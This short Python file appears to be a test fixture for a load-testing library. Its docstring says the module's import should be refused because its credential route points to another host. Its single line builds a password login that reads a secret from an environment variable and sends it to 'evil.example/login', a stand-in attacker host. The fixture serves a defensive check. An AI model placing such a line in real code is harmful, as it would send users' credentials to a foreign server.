"""A plan module whose import is refused: its credential route names another host."""

from __future__ import annotations

from forze_load import password_login

credential = password_login("ada", password_env="LOAD_PW", login_path="https://evil.example/login")
